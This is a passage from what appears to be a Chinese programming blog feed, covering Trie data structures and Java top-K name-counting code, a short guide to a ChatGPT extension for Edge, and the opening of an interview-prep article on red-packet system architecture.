trie中的键是一串位元，可以用于表示整数或者内存地址</p><p><strong>Trie树基本性质</strong></p><p>1，根节点不包含字符，除根节点意外每个节点只包含一个字符。</p><p>2，从根节点到某一个节点，路径上经过的字符连接起来，为该节点对应的字符串。</p><p>3，每个节点的所有子节点包含的字符串不相同。</p><p><strong>Trie树优点</strong>：</p><p>可以最大限度地减少无谓的字符串比较，故可以用于词频统计和大量字符串排序。</p><p>跟哈希表比较：</p><p>1，最坏情况时间复杂度比hash表好</p><p>2，没有冲突，除非一个key对应多个值（除key外的其他信息）</p><p>3，自带排序功能（类似Radix Sort），中序遍历trie可以得到排序。</p><p><strong>Trie树缺点</strong>：</p><p>当所有关键字都不具有相同或类似的前缀，空间消耗过大.</p><h2 id="6-Trie树的基本操作"><a href="#6-Trie树的基本操作" class="headerlink" title="6. Trie树的基本操作:"></a>6. Trie树的基本操作:</h2><ul><li><p>插入:将一个字符串逐字符插入到Trie树中</p></li><li><p>查找:检查Trie树中是否存在某个字符串</p></li><li><p>前缀匹配:查找所有以某个前缀开头的字符串</p></li><li><p>删除:从Trie树中删除一个字符串</p></li></ul><h2 id="7-Trie树的应用场景"><a href="#7-Trie树的应用场景" class="headerlink" title="7. Trie树的应用场景:"></a>7. Trie树的应用场景:</h2><p>1.字符串检索:</p><ul><li><p>应用场景:快速检索字典中的单词</p></li><li><p>使用原因:Trie树通过逐字符匹配,可以在O(L)时间内完成字符串的检索,其中L是字符串的长度,比传统的线性搜索更加高效</p></li></ul><p>2.自动补全:</p><ul><li><p>应用场景:搜索引擎和输入法中的自动补全功能</p></li><li><p>适用原因:Trie树可以通过前缀查找快速提供所有以给定前缀开头的单词,有效提升用户输入体验</p></li></ul><p>3.前缀匹配:</p><ul><li><p>应用场景:寻找以特定前缀开头的所有字符串,如电话号码前缀匹配</p></li><li><p>适用原因:Trie树天生适合处理前缀匹配问题,可以在O(L)时间内找到所有以特定前缀开头的字符串</p></li></ul><p>4.词频统计:</p><ul><li><p>应用场景:文本分析中统计单词出现频率</p></li><li><p>适用原因:Trie树可以在插入过程中记录每个单词的出现次数,通过遍历Trie树可以快速统计所有单词的频率</p></li></ul><p>为什么适合这些场景:</p><p>5.多模式匹配:</p><ul><li><p>应用场景:从文本中同时搜索多个模式(模式匹配算法)</p></li><li><p>适用原因:Trie树可以构建多个模式的结构,通过一次遍历文本同时匹配多个模式,提高匹配效率</p></li></ul><p>为什么适用于这些场景:</p><p>1.空间效率:</p><ul><li><p>共享前缀:Trie树通过共享前缀节点，减少了重复存储相同前缀的空间开销。</p></li><li><p>节省内存:对于大量前缀相同的字符串集合，Trie树显著节省内存使用。</p></li></ul><p>2.时间效率:</p><ul><li><p>O(L)复杂度:插入、查找和前缀匹配操作的时间复杂度为O(L),其中L是字符串的长度,显著提高了操作效率</p></li><li><p>快速检索:相比于其他线性结构(如数组或链表),Trie树在处理大量字符串时更快</p></li></ul><h2 id="8-Trie树的代码实现"><a href="#8-Trie树的代码实现" class="headerlink" title="8. Trie树的代码实现:"></a>8. Trie树的代码实现:</h2><p>以下是一个 参考代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">import java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">class TrieNode &#123;  </span><br><span class="line">    Map&lt;Character, TrieNode&gt; children;  </span><br><span class="line">    int count;  </span><br><span class="line">  </span><br><span class="line">    public TrieNode() &#123;  </span><br><span class="line">        children = new HashMap&lt;&gt;();  </span><br><span class="line">        count = 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class Trie &#123;  </span><br><span class="line">    private TrieNode root;  </span><br><span class="line">  </span><br><span class="line">    public Trie() &#123;  </span><br><span class="line">        root = new TrieNode();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public void insert(String name) &#123;  </span><br><span class="line">        TrieNode node = root;  </span><br><span class="line">        for (char ch : name.toCharArray()) &#123;  </span><br><span class="line">            node = node.children.computeIfAbsent(ch, k -&gt; new TrieNode());  </span><br><span class="line">        &#125;  </span><br><span class="line">        node.count++;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public void getAllNames(TrieNode node, StringBuilder prefix, PriorityQueue&lt;NameCount&gt; minHeap, int k) &#123;  </span><br><span class="line">        if (node == null) return;  </span><br><span class="line">        if (node.count &gt; 0) &#123;  </span><br><span class="line">            if (minHeap.size() &lt; k) &#123;  </span><br><span class="line">                minHeap.offer(new NameCount(prefix.toString(), node.count));  </span><br><span class="line">            &#125; else if (node.count &gt; minHeap.peek().count) &#123;  </span><br><span class="line">                minHeap.poll();  </span><br><span class="line">                minHeap.offer(new NameCount(prefix.toString(), node.count));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        for (Map.Entry&lt;Character, TrieNode&gt; entry : node.children.entrySet()) &#123;  </span><br><span class="line">            prefix.append(entry.getKey());  </span><br><span class="line">            getAllNames(entry.getValue(), prefix, minHeap, k);  </span><br><span class="line">            prefix.deleteCharAt(prefix.length() - 1);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public PriorityQueue&lt;NameCount&gt; getTopKNames(int k) &#123;  </span><br><span class="line">        PriorityQueue&lt;NameCount&gt; minHeap = new PriorityQueue&lt;&gt;(k);  </span><br><span class="line">        getAllNames(root, new StringBuilder(), minHeap, k);  </span><br><span class="line">        return minHeap;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class NameCount implements Comparable&lt;NameCount\&gt; &#123;  </span><br><span class="line">    String name;  </span><br><span class="line">    int count;  </span><br><span class="line">  </span><br><span class="line">    public NameCount(String name, int count) &#123;  </span><br><span class="line">        this.name = name;  </span><br><span class="line">        this.count = count;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public int compareTo(NameCount other) &#123;  </span><br><span class="line">        return Integer.compare(this.count, other.count);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public String toString() &#123;  </span><br><span class="line">        return name + &quot;: &quot; + count;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">public class Main &#123;  </span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line">        String\[\] names = &#123;&quot;张伟&quot;, &quot;王伟伟&quot;, &quot;王芳&quot;, &quot;李伟&quot;, &quot;李娜&quot;&#125;; // 示例数据  </span><br><span class="line">        int k = 100; // 找到前100个重名人数最多的姓名  </span><br><span class="line">  </span><br><span class="line">        Trie trie = new Trie();  </span><br><span class="line">        for (String name : names) &#123;  </span><br><span class="line">            trie.insert(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        PriorityQueue&lt;NameCount&gt; topKNames = trie.getTopKNames(k);  </span><br><span class="line">        while (!topKNames.isEmpty()) &#123;  </span><br><span class="line">            System.out.println(topKNames.poll());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="9-TOP-N问题发散"><a href="#9-TOP-N问题发散" class="headerlink" title="9. TOP N问题发散:"></a>9. TOP N问题发散:</h2><p>上面的问题进行改进一下, 如果我们对内存有一个限制,比如:要求内存的使用不能超过2G,</p><p>注意，这里的内存受限，尽量使用磁盘处理。</p><blockquote><p>这里使用hashmap，而不适用 trie树的原因是？</p><p>trie树是按照字符为粒度组织树的节点的，进行磁盘操作性能不高，而且进行磁盘操作时算法更加复杂。</p><p>hashmap 是以key为单位操作的， 磁盘操作的效率高。而且 hashmap 统计的时候，代码简洁清晰。</p></blockquote><p>尽管我们hashmap，也不能直接将所有数据加载到内存中处理,</p><p>所以可以采取分治的策略,使用外部排序和哈希映射的方法,</p><p>以下是详细的步骤:</p><p>1.分块读取数据:将14亿条记录分成多个较小的块,每次读取一部分数据到内存中进行处理</p><p>2.哈希映射统计词频:对每个块的数据进行哈希映射,统计每个名字出现的次数,将结果写入到磁盘文件</p><p>3.合并词频统计结果:读取所有中间文件,合并词频统计结果,得到全局的词频统计</p><p>4.使用小顶堆找出前100个重复最多的名字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.\*;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">import java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">class NameCount implements Comparable&lt;NameCount\&gt; &#123;  </span><br><span class="line">    String name;  </span><br><span class="line">    int count;  </span><br><span class="line">  </span><br><span class="line">    public NameCount(String name, int count) &#123;  </span><br><span class="line">        this.name = name;  </span><br><span class="line">        this.count = count;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public int compareTo(NameCount other) &#123;  </span><br><span class="line">        return Integer.compare(this.count, other.count);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public String toString() &#123;  </span><br><span class="line">        return name + &quot;: &quot; + count;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">public class ExternalMemoryTopK &#123;  </span><br><span class="line">    private static final int CHUNK\_SIZE = 1000000; // 每个块处理100万条记录  </span><br><span class="line">  </span><br><span class="line">    public static void main(String\[\] args) throws IOException &#123;  </span><br><span class="line">        String inputFile = &quot;names.txt&quot;;  </span><br><span class="line">        String outputFile = &quot;top100names.txt&quot;;  </span><br><span class="line">        int k = 100;  </span><br><span class="line">  </span><br><span class="line">        // 第一步：分块读取数据并统计词频  </span><br><span class="line">        int chunkIndex = 0;  </span><br><span class="line">        BufferedReader reader = new BufferedReader(new FileReader(inputFile));  </span><br><span class="line">        String line;  </span><br><span class="line">        while ((line = reader.readLine()) != null) &#123;  </span><br><span class="line">            Map&lt;String, Integer&gt; frequencyMap = new HashMap&lt;&gt;();  </span><br><span class="line">            int lineCount = 0;  </span><br><span class="line">            while (line != null &amp;&amp; lineCount &lt; CHUNK\_SIZE) &#123;  </span><br><span class="line">                frequencyMap.put(line, frequencyMap.getOrDefault(line, 0) + 1);  </span><br><span class="line">                line = reader.readLine();  </span><br><span class="line">                lineCount++;  </span><br><span class="line">            &#125;  </span><br><span class="line">            writeFrequencyMapToFile(frequencyMap, &quot;chunk\_&quot; + chunkIndex + &quot;.txt&quot;);  </span><br><span class="line">            chunkIndex++;  </span><br><span class="line">        &#125;  </span><br><span class="line">        reader.close();  </span><br><span class="line">  </span><br><span class="line">        // 第二步：合并所有块的词频统计结果  </span><br><span class="line">        Map&lt;String, Integer&gt; globalFrequencyMap = new HashMap&lt;&gt;();  </span><br><span class="line">        for (int i = 0; i &lt; chunkIndex; i++) &#123;  </span><br><span class="line">            mergeFrequencyMapFromFile(globalFrequencyMap, &quot;chunk\_&quot; + i + &quot;.txt&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        // 第三步：使用小顶堆找出前100个重复最多的名字  </span><br><span class="line">        PriorityQueue&lt;NameCount&gt; minHeap = new PriorityQueue&lt;&gt;(k);  </span><br><span class="line">        for (Map.Entry&lt;String, Integer&gt; entry : globalFrequencyMap.entrySet()) &#123;  </span><br><span class="line">            if (minHeap.size() &lt; k) &#123;  </span><br><span class="line">                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  </span><br><span class="line">            &#125; else if (entry.getValue() &gt; minHeap.peek().count) &#123;  </span><br><span class="line">                minHeap.poll();  </span><br><span class="line">                minHeap.offer(new NameCount(entry.getKey(), entry.getValue()));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        // 输出结果  </span><br><span class="line">        BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));  </span><br><span class="line">        while (!minHeap.isEmpty()) &#123;  </span><br><span class="line">            writer.write(minHeap.poll().toString());  </span><br><span class="line">            writer.newLine();  </span><br><span class="line">        &#125;  </span><br><span class="line">        writer.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    private static void writeFrequencyMapToFile(Map&lt;String, Integer&gt; frequencyMap, String filename) throws IOException &#123;  </span><br><span class="line">        BufferedWriter writer = new BufferedWriter(new FileWriter(filename));  </span><br><span class="line">        for (Map.Entry&lt;String, Integer&gt; entry : frequencyMap.entrySet()) &#123;  </span><br><span class="line">            writer.write(entry.getKey() + &quot; &quot; + entry.getValue());  </span><br><span class="line">            writer.newLine();  </span><br><span class="line">        &#125;  </span><br><span class="line">        writer.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    private static void mergeFrequencyMapFromFile(Map&lt;String, Integer&gt; globalFrequencyMap, String filename) throws IOException &#123;  </span><br><span class="line">        BufferedReader reader = new BufferedReader(new FileReader(filename));  </span><br><span class="line">        String line;  </span><br><span class="line">        while ((line = reader.readLine()) != null) &#123;  </span><br><span class="line">            String\[\] parts = line.split(&quot; &quot;);  </span><br><span class="line">            String name = parts\[0\];  </span><br><span class="line">            int count = Integer.parseInt(parts\[1\]);  </span><br><span class="line">            globalFrequencyMap.put(name, globalFrequencyMap.getOrDefault(name, 0) + count);  </span><br><span class="line">        &#125;  </span><br><span class="line">        reader.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="10-topK问题-典型的解题思路"><a href="#10-topK问题-典型的解题思路" class="headerlink" title="10. topK问题,典型的解题思路"></a>10. topK问题,典型的解题思路</h2><p>这是一种典型的topK问题,一般的问法如下：</p><p>从一堆数据中选出多少个最大或最小数？</p><p>解题思想：</p><ol><li><p>先统计数量, 使用前缀树，hashmap等</p></li><li><p>再用小顶堆或者 大顶堆</p></li></ol><p>取大用小，取小用大。简单来说就是取最大的K个数就用小顶堆，取最小的K个数，就用大顶堆</p><p>取海量数据里面最小的K个数？</p><p>要找出数组中最小的K个数，就要构造一个有K个元素的大顶堆，因为大顶堆的堆顶值是最大的，其它元素和堆顶的元素比较，大于堆顶的元素，换一个元素继续，小于堆顶的元素，将堆顶元素出堆，将更小的元素插入堆顶，如此反复，堆里面就是最小的数</p><p>取海量数据里面最大的K个数？</p><p>要找出数组中最大的K个数，就要构造一个有K个元素的小顶堆，因为小顶堆的堆顶值是最小的，其它元素和堆顶的元素比较，大于堆顶的元素，堆顶的元素出堆，将元素插入到小顶堆，将更大的元素换到堆中，如此反复，堆里面就是最大的数</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Edge浏览器中使用免费的ChatGPT</title>
      
      <link href="/2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/"/>
      <url>/2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/</url>
      
        <content type="html"><![CDATA[<h1 id="Microsoft-Edge浏览器中使用免费的ChatGPT"><a href="#Microsoft-Edge浏览器中使用免费的ChatGPT" class="headerlink" title="Microsoft Edge浏览器中使用免费的ChatGPT"></a>Microsoft Edge浏览器中使用免费的ChatGPT</h1><h2 id="一、双击打开浏览器"><a href="#一、双击打开浏览器" class="headerlink" title="一、双击打开浏览器 "></a>一、双击打开浏览器 <img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/1.png"></h2><p>找到：扩展，打开</p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/2.png"></p><h2 id="二、打开Microsoft-Edge加载项"><a href="#二、打开Microsoft-Edge加载项" class="headerlink" title="二、打开Microsoft Edge加载项"></a>二、打开Microsoft Edge加载项</h2><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/3.png"></p><h2 id="三、Move-tab新标签-获取免费ChatGPT"><a href="#三、Move-tab新标签-获取免费ChatGPT" class="headerlink" title="三、Move tab新标签 获取免费ChatGPT"></a>三、Move tab新标签 获取免费ChatGPT</h2><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/4.png"></p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/5.png"></p><h2 id="四、启用Move-tab。启用ChatGPT。"><a href="#四、启用Move-tab。启用ChatGPT。" class="headerlink" title="四、启用Move tab。启用ChatGPT。"></a>四、启用Move tab。启用ChatGPT。</h2><p>扩展</p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/6.png"></p><p>管理扩展</p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/7.png"></p><p>启用</p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/8.png"></p><h2 id="五、新建标签页，使用GPT"><a href="#五、新建标签页，使用GPT" class="headerlink" title="五、新建标签页，使用GPT"></a>五、新建标签页，使用GPT</h2><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/9.png"></p><h2 id="六、使用举例"><a href="#六、使用举例" class="headerlink" title="六、使用举例"></a>六、使用举例</h2><p>提问</p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/10.png"></p><p>GPT回复</p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/11.png"></p><p><img src="/./2024/06/01/Edge%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%85%8D%E8%B4%B9%E7%9A%84ChatGPT/12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ChatGpt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>百亿流量红包系统</title>
      
      <link href="/2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="百亿流量红包系统，如何架构？（字节面试真题）"><a href="#百亿流量红包系统，如何架构？（字节面试真题）" class="headerlink" title="百亿流量红包系统，如何架构？（字节面试真题）"></a>百亿流量红包系统，如何架构？（字节面试真题）</h1><h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>在读者交流群(50+)中，最近有小伙伴拿到了一线互联网企业如得物、阿里、滴滴、极兔、有赞、希音、百度、网易、美团的面试资格，遇到很多很重要的架构类&#x2F;设计类的场景题：</p><blockquote><p>1.如何设计百亿流量高并发红包系统 ，请说出你的方案？</p><p>2.听说你会架构设计，请问一下如果让你来设计百亿流量红包系统，说说你的架构设计方案。</p></blockquote><p>最近有小伙伴在面试字节，又遇到了红包架构问题。小伙伴支支吾吾的说了几句，面试挂了。</p><p>所以，给大家做一下系统化、体系化的梳理，使得大家内力猛增，可以充分展示一下大家雄厚的 “技术肌肉”，<strong>让面试官爱到 “不能自已、口水直流”</strong>，然后实现”offer直提”。</p><h2 id="本文目录"><a href="#本文目录" class="headerlink" title="本文目录"></a>本文目录</h2><p><strong>- 说在前面</strong></p><p><strong>- 本文目录</strong></p><p>- 红包架构背景</p><h5 id="红包系统和秒杀系统的对比"><a href="#红包系统和秒杀系统的对比" class="headerlink" title="-红包系统和秒杀系统的对比"></a>-红包系统和秒杀系统的对比</h5><p><strong>- 红包系统功能分析</strong></p><p>- 功能1：包红包</p><p>- 功能2：发红包</p><p>- 功能3：抢红包</p><p>- 功能4：拆红包</p><h5 id="微信红包的业务特点"><a href="#微信红包的业务特点" class="headerlink" title="-微信红包的业务特点"></a>-微信红包的业务特点</h5><h5 id="微信红包的技术难点"><a href="#微信红包的技术难点" class="headerlink" title="-微信红包的技术难点"></a>-微信红包的技术难点</h5><p>- 红包系统概要设计</p><h5 id="系统功能说明"><a href="#系统功能说明" class="headerlink" title="-系统功能说明"></a>-系统功能说明</h5><p><strong>- 数据库设计</strong></p><h5 id="发红包"><a href="#发红包" class="headerlink" title="-发红包"></a>-发红包</h5><h5 id="抢红包"><a href="#抢红包" class="headerlink" title="-抢红包"></a>-抢红包</h5><p><strong>- 红包系统详细设计</strong></p><p>- 红包整体架构</p><p>- 高并发常用解决方案</p><p>- 1- 使用内存替代实时的DB</p><p>- 2- 使用乐观锁替代悲观锁</p><h5 id="JVM-CAS-乐观锁方案"><a href="#JVM-CAS-乐观锁方案" class="headerlink" title="-JVM CAS 乐观锁方案"></a>-JVM CAS 乐观锁方案</h5><p><strong>- 微信红包系统的高并发解决方案</strong></p><h5 id="1-分而治之：系统架构设计垂直Set化。"><a href="#1-分而治之：系统架构设计垂直Set化。" class="headerlink" title="-1- 分而治之：系统架构设计垂直Set化。"></a>-1- 分而治之：系统架构设计垂直Set化。</h5><h5 id="2-解决DB并发：逻辑Server层将请求排队。"><a href="#2-解决DB并发：逻辑Server层将请求排队。" class="headerlink" title="-2- 解决DB并发：逻辑Server层将请求排队。"></a>-2- 解决DB并发：逻辑Server层将请求排队。</h5><h5 id="3-系统性能稳定性保障：双维度分库分表设计。"><a href="#3-系统性能稳定性保障：双维度分库分表设计。" class="headerlink" title="-3- 系统性能稳定性保障：双维度分库分表设计。"></a>-3- 系统性能稳定性保障：双维度分库分表设计。</h5><h5 id="红包分配算法"><a href="#红包分配算法" class="headerlink" title="- 红包分配算法"></a>- 红包分配算法</h5><h5 id="1-实时拆分"><a href="#1-实时拆分" class="headerlink" title="-1- 实时拆分"></a>-1- 实时拆分</h5><h5 id="2-预先生成"><a href="#2-预先生成" class="headerlink" title="-2- 预先生成"></a>-2- 预先生成</h5><h5 id="3-二倍均值法"><a href="#3-二倍均值法" class="headerlink" title="-3- 二倍均值法"></a>-3- 二倍均值法</h5><p><strong>- 红包系统高可用架构设计</strong></p><h5 id="1-系统可用性影响因素"><a href="#1-系统可用性影响因素" class="headerlink" title="-1 - 系统可用性影响因素"></a>-1 - 系统可用性影响因素</h5><h5 id="2-红包系统可用性设计方向"><a href="#2-红包系统可用性设计方向" class="headerlink" title="-2 - 红包系统可用性设计方向"></a>-2 - 红包系统可用性设计方向</h5><h5 id="3-业务逻辑层-部署方案设计"><a href="#3-业务逻辑层-部署方案设计" class="headerlink" title="-3 - 业务逻辑层 - 部署方案设计"></a>-3 - 业务逻辑层 - 部署方案设计</h5><h5 id="4-业务逻辑层-异步化设计"><a href="#4-业务逻辑层-异步化设计" class="headerlink" title="-4 - 业务逻辑层 - 异步化设计"></a>-4 - 业务逻辑层 - 异步化设计</h5><h5 id="5-订单存储层-故障自愈"><a href="#5-订单存储层-故障自愈" class="headerlink" title="-5 - 订单存储层 - 故障自愈"></a>-5 - 订单存储层 - 故障自愈</h5><h5 id="6-订单存储层-平行扩容设计"><a href="#6-订单存储层-平行扩容设计" class="headerlink" title="-6 - 订单存储层 - 平行扩容设计"></a>-6 - 订单存储层 - 平行扩容设计</h5><p>- 总结</p><h3 id="红包架构背景"><a href="#红包架构背景" class="headerlink" title="红包架构背景"></a>红包架构背景</h3><p>红包是一种 瞬时流量很大的应用， 会在很短的时间内，产生巨大的瞬时流量，</p><p>所以，作为架构师来说，这种场景有很大的架构挑战</p><p>以2017年除夕为例，微信红包峰值QPS在76w左右，除夕当天收发微信红包的数量为142亿个。</p><p>这种百亿级别的数据量、100Wqps级别的超高并发，而且整个系统核心功能和支付相关，需要做好高并发、高可用、高可靠。</p><blockquote><p>特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。</p><p>架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><h4 id="红包系统和秒杀系统的对比-1"><a href="#红包系统和秒杀系统的对比-1" class="headerlink" title="红包系统和秒杀系统的对比"></a>红包系统和秒杀系统的对比</h4><p>我们先了解下微信红包支付的流程。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/1.png"><br>在上面的红包流程中，核心业务包含包红包、发红包、抢红包、拆红包</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/2.png"><br>其中最关键的步骤是</p><ul><li><p>发红包</p></li><li><p>抢红包。</p></li></ul><p>在整个体系中，红包系统 是 支付系统的商户，红包这个商户出售的是钱。</p><p>所以，用户发红包在红包系统 使用微信支付购买一份 红包商品，红包系统 将钱发放到相对应的微信群，供参与者领取。</p><p>微信群里的用户抢红包，得到的是商品里边的 零钱。</p><p>在整个体系中，红包系统 和支付系统 之间的关系是商家和第三方支付平台的关系。</p><p>红包的流程，很类似 商品“秒杀”活动。</p><ul><li><p>包红包类似秒杀商品管理</p></li><li><p>发红包类似“秒杀”活动的商品上架；</p></li><li><p>抢红包等同于“秒杀”活动中的查询库存；</p></li><li><p>拆红包对应“秒杀”活动中用户的“秒杀”动作。</p></li></ul><p>不过除了上面的相同点之外，红包业务 与 “秒杀”活动相比，还具备自身的特点：</p><p>首先，抢红包 比 “秒杀”有更海量的并发要求。假设同一时间有 10 万个群里的用户同时在发红包，那就相当于同一时间有 10 万个“秒杀”活动发布出去。10 万个微信群里的用户同时抢红包，将产生海量的并发请求。</p><p>其次，微信红包业务要求更严格的安全级别。红包业务本质上是资金交易。资金交易业务比普通商品“秒杀”活动有更高的安全级别要求。</p><ul><li><p><strong>“秒杀”时可以允许存在“超卖”（即实际被抢的商品数量比计划的库存多）、“少卖”（即实际被抢的商户数量比计划的库存少）的情况。</strong></p></li><li><p><strong>但是对于 红包，不允许存在“超卖”、“少卖”。</strong></p></li></ul><blockquote><p>特别说明：红包架构也是高端面试的核心场景题, 后面也会以视频的形式，对这些架构的一系列的架构场景题目，做系统化的介绍。</p><p>架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><h2 id="红包系统功能分析"><a href="#红包系统功能分析" class="headerlink" title="红包系统功能分析"></a>红包系统功能分析</h2><p>接下来，40岁老架构带大家，从架构师视角开始红包系统的功能分析。</p><p>微信红包和微信支付之间的交互，与普通商家与微信支付的交互一样，需要经过多个步骤。</p><ul><li><p>用户发红包时，进入微信红包下一笔订单，系统记录发红包用户、发红包金额、红包数量和要发送到的用微信群。</p></li><li><p>然后微信红包系统请求微信支付服务器进行下单，用户使用微信支付进行支付。</p></li><li><p>支付成功后，微信支付后台系统通知微信红包后台系统支付成功结果，微信红包后台系统收到通知后推送微信红包消息到微信群。</p></li><li><p>微信群里用户便可抢红包。</p></li><li><p>用户发现红包还有剩余，就可以拆剩下的红包</p></li></ul><p>这就是微信红包和微信支付的关系以及交互过程。</p><h3 id="功能1：包红包"><a href="#功能1：包红包" class="headerlink" title="功能1：包红包"></a>功能1：包红包</h3><p>系统给每个红包分配一个唯一ID，也就是发红包的订单号，然后将红包发送给用户，红包的个数，红包金额写入到存储。</p><h3 id="功能2：发红包"><a href="#功能2：发红包" class="headerlink" title="功能2：发红包"></a>功能2：发红包</h3><p>用户使用微信支付完成付款，微信红包后台收到微信支付成功的通知。红包系统将红包发送订单状态更新，更新为用户已支付，并写入用户发红包记录表，这样用户可以在钱包中找到用户的发红包流水和收发红包的记录，之后微信红包系统调用微信通知，将微信红包信息发送到微信群。</p><h3 id="功能3：抢红包"><a href="#功能3：抢红包" class="headerlink" title="功能3：抢红包"></a>功能3：抢红包</h3><p>微信群中的用户收到红包消息之后，点开红包，开始抢红包，这个过程微信红包系统会检查红包是否已经被抢完，是否已经过期，是否已经抢过等验证逻辑。</p><h3 id="功能4：拆红包"><a href="#功能4：拆红包" class="headerlink" 